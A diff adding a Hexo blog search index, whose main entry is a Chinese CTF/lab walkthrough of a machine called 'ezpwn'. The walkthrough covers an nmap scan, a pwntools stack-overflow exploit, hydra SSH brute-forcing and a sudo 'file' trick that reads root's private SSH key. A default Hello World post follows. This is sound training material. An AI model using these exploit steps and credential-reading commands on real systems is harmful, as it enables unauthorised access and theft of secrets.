@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>ezpwn_提权处理</title>
+      <link href="/2025/12/18/ezpwn-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/"/>
+      <url>/2025/12/18/ezpwn-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<p>首先扫描端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -p- 192.168.43.100</span><br></pre></td></tr></table></figure><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217172308957.png" alt="image-20251217172308957"></p><p>发现开了一个6538的端口</p><p>下载overflow文件并用idapro打开</p><p>用f5查看伪代码并进入start里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl start()</span><br><span class="line">&#123;</span><br><span class="line">  char a[12]; // [rsp+Fh] [rbp-11h] BYREF</span><br><span class="line">  char c[2]; // [rsp+1Bh] [rbp-5h]</span><br><span class="line">  char b[3]; // [rsp+1Dh] [rbp-3h]</span><br><span class="line"></span><br><span class="line">  gets(a);  //当输入长度超过a的大小时会溢出覆盖c和b的内存</span><br><span class="line">  if ( b[1] == 115 &amp;&amp; c[1] == 112 )</span><br><span class="line">    port();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们利用栈溢出漏洞来写一个pwn脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">proc = remote(&#x27;192.168.43.100&#x27;, 9999)</span><br><span class="line"># 构造 payload：</span><br><span class="line"># a[12] + 填充到c[1]的位置 + &#x27;p&#x27; + 填充到b[1]的位置 + &#x27;s&#x27;</span><br><span class="line">offset_to_c1 = 12 + 1  # a[12]后第1个字节是c[1]</span><br><span class="line">offset_to_b1 = 12 + 2 + 1  # a[12] + c[2]后第1个字节是b[1]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * 12  # 填满a[12]</span><br><span class="line">payload += b&#x27;X&#x27; * 1  # 填充到c[1]的位置</span><br><span class="line">payload += b&#x27;p&#x27;      # 设置c[1] = &#x27;p&#x27; (ASCII 112)</span><br><span class="line">payload += b&#x27;Y&#x27; * 1  # 填充到b[1]的位置</span><br><span class="line">payload += b&#x27;s&#x27;      # 设置b[1] = &#x27;s&#x27; (ASCII 115)</span><br><span class="line"></span><br><span class="line"># 发送payload</span><br><span class="line">proc.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 交互（查看程序输出或进一步操作）</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure><p>运行完后告诉我们开了一个新的窗口</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171837213.png" alt="image-20251217171837213"></p><p>所以我们再用nmap来进行扫一遍</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171856297.png" alt="image-20251217171856297"></p><p>发现新开了一个11450端口 </p><p>将两个文件下载后  再次用idapro打开ret2text</p><p>由hint提示可知密码就是偏移量</p><p>因为home下面的肯定是用户名即a</p><p>用python生成一个密码本（先尝试0x0~0x1000爆破）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l a -P /home/kali/Desktop/a.txt 192.168</span><br><span class="line">.1.167 ssh</span><br></pre></td></tr></table></figure><p>爆破得知密码为0x12</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171910648.png" alt="image-20251217171910648"></p><p>接着用ssh连接</p><p>拿到user</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171921163.png" alt="image-20251217171921163"></p><p>下一步就是提权拿到root</p><p>用 sudo -l 列出允许用户可以使用的命令</p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20251217171934178.png" alt="image-20251217171934178"></p><p>发现里面有一个file文件<a href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E4%B8%8B%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2file%E7%9A%84%E5%85%B7%E4%BD%93%E7%94%A8%E6%B3%95">https://gtfobins.github.io/在这个网站下可以搜索file的具体用法</a></p><p>我们用sudo file -f &#x2F;root&#x2F;.ssh&#x2F;id_rsa下查看它的私钥</p><p>接着用xterminal进行ssh连接</p><p>就可以找到在root文件下有个rt.txt文件  root的flag就藏在着</p><p>flag{4z_pW’_r;o1t}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+            <tag> SSH爆破 </tag>
+            
+            <tag> 提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2025/12/18/hello-world/"/>
+      <url>/2025/12/18/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
